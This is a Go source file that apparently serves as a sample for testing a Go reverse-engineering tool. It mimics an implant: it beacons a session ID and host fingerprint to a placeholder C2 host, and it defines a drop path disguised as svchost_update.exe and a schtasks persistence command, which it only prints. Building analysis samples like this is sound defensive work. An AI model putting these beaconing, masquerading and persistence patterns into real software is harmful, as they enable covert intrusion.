// Demo program used to generate stripped test samples for gores.
// It mimics the shape of a small Go implant: beacon loop, config
// strings, a couple of third-party deps.
package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/google/uuid"
)

const (
	c2URL      = "https://cdn-metrics.example.net/api/v2/beacon"
	uaString   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	mutexName  = "Global\\{7F3A9C1E-42D8-4B6A-9E1F-8C2D5A6B7E8F}"
	dropPath   = "C:\\ProgramData\\svchost_update.exe"
	persistCmd = "schtasks /create /tn WindowsUpdateCheck /tr %s /sc daily"
)

type Config struct {
	ID        string
	Interval  time.Duration
	JitterPct int
}

func fingerprint(host string) string {
	h := sha256.Sum256([]byte(host + mutexName))
	return hex.EncodeToString(h[:8])
}

func beacon(cfg Config) error {
	req, err := http.NewRequest("POST", c2URL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", uaString)
	req.Header.Set("X-Session-Id", cfg.ID)
	req.Header.Set("X-Host-Fp", fingerprint("workstation"))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("beacon to %s failed: %w", c2URL, err)
	}
	defer resp.Body.Close()
	return nil
}

func install() error {
	if _, err := os.Stat(dropPath); err == nil {
		return nil
	}
	fmt.Printf("[*] would write payload to %s\n", dropPath)
	fmt.Printf("[*] persist: "+persistCmd+"\n", dropPath)
	return nil
}

func main() {
	cfg := Config{
		ID:        uuid.NewString(),
		Interval:  30 * time.Second,
		JitterPct: 20,
	}
	fmt.Println("[*] agent id:", cfg.ID)
	if err := install(); err != nil {
		fmt.Fprintln(os.Stderr, "install:", err)
	}
	if err := beacon(cfg); err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
	fmt.Println("[*] done")
}
